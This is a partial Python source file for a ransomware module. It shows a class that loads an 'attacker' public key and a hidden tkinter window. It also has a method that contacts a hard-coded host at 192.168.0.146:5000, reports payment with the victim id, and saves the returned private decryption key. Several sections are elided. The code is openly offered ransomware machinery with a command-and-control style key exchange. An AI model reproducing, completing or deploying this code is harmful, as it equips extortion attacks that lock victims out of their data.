...
class RansomwareModule:
    def __init__(self, id, public_keyfile, root, directory="ransomewareModule\\files"):
        self.id = id
...
"""
    ...
    def pay_now(self):
        ...
        decryption_key = "ransomewareModule\\private_attacker.pem"
    ...
    def get_decryption_key(self, host='192.168.0.146', port=5000):
        """
        a method that fetches the decryption key 
        """
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            payment = f"paymentsuccess*{self.id}"
            s.sendall(payment.encode('utf-8'))
            print("Sent payment_success message.")
            response = s.recv(1024)
            ransomware_decryption_key= response.decode('utf-8')
            print(f"Received: {ransomware_decryption_key}")

            with open("ransomewareModule\\private_attacker.pem", "w") as encryption_key:
                encryption_key.write(ransomware_decryption_key)
            
            print("[+] decryption key succesfully installed")

def automate(id):
    root = tk.Tk()
    root.withdraw()  #Hide the root window
    ransomware = RansomwareModule(id,"ransomewareModule\\public_attacker.pem",root) #call the ransomeware class
    root.mainloop()
